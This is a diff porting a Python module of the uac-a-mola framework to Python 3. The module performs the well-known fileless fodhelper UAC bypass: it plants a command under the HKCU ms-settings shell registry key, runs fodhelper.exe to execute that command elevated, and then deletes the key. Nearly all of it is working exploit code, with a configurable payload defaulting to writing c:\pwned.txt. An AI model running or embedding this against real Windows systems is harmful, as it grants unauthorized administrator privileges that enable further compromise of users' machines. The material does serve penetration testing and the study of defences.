@@ -1,51 +1,49 @@
 #--encoding: utf-8--
 
 # This file is part of uac-a-mola
-# Author: Santiago Hernández Ramos (shramos@protonmail.com)
+# Author: Santiago Hernandez Ramos (shramos@protonmail.com)
 #
 # DESCRIPTION
-# Fileless - Fodhelper bypass UAC 
+# Fileless - Fodhelper bypass UAC
 
+try:
+    from ...module import Module
+    from ...support.winreg import Registry
+except ImportError:
+    from module import Module
+    from support.winreg import Registry
+from winreg import HKEY_CURRENT_USER as HKCU
 
-from module import Module
-import psutil
-from termcolor import colored
-from support.winreg import Registry
-from _winreg import HKEY_CURRENT_USER as HKCU
-import os
 
 class CustomModule(Module):
     def __init__(self):
         information = {"Name": "Fileless Fodhelper",
                        "Description": "Fileless - Fodhelper bypass UAC ",
-                       "Author": "Santiago Hernández Ramos"}
+                       "Author": "Santiago Hernandez Ramos"}
 
         # -----------name-----default_value--description
-        options = {"instruction": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]
-                   }
+        options = {"instruction": [r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]}
 
         # Constructor of the parent class
         super(CustomModule, self).__init__(information, options)
 
-        # Class atributes, initialization in the run_module method
+        # Class attributes, initialization in the run_module method
         # after the user has set the values
         self.reg = Registry()
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        print "Creating hive..."
-        k = self.reg.create_key(HKCU,"Software\\Classes\\ms-settings\\Shell\\Open\\command")
-        print "Created hive"
-        print "Setting 'Default'..."
-        self.reg.set_value(HKCU,"Software\\Classes\\ms-settings\\shell\\open\\command", self.args["instruction"])
-        print "Creating DelegateExecute Value"
+        print("Creating hive...")
+        k = self.reg.create_key(HKCU, "Software\\Classes\\ms-settings\\Shell\\Open\\command")
+        print("Created hive")
+        print("Setting 'Default'...")
+        self.reg.set_value(HKCU, "Software\\Classes\\ms-settings\\shell\\open\\command", self.args["instruction"])
+        print("Creating DelegateExecute Value")
         self.reg.create_value(k, "DelegateExecute", "")
-        print "Done!"
-        print "Executing... fodhelper.exe"
+        print("Done!")
+        print("Executing... fodhelper.exe")
         self.run_binary("C:\\Windows\\System32\\fodhelper.exe")
-        print "Got it? :D"
-        print "Now... Deleting hive!"
+        print("Got it? :D")
+        print("Now... Deleting hive!")
         self.reg.restore(k)
-        print "Deleted!"
-
-			
+        print("Deleted!")
